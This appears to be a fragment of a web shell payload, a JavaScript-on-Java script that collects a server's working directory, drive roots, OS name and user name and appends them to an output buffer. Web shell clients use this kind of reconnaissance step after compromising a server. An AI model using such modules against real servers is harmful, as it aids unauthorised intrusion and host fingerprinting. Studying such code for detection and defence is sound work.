function SysInfoCode() {
  var d = System.getProperty("user.dir");
  var serverInfo = System.getProperty("os.name");
  var user = System.getProperty("user.name");
  var driverlist = WwwRootPathCode(d);
  return d + "\t" + driverlist + "\t" + serverInfo + "\t" + user;
}

function WwwRootPathCode(d) {
  var s = "";
  if (!d.substring(0, 1).equals("/")) {
    var roots = java.io.File.listRoots();
    for (var i = 0; i < roots.length; i++) {
      s += roots[i].toString().substring(0, 2) + "";
    }
  } else {
    s += "/";
  }
  return s;
}
output.append(SysInfoCode());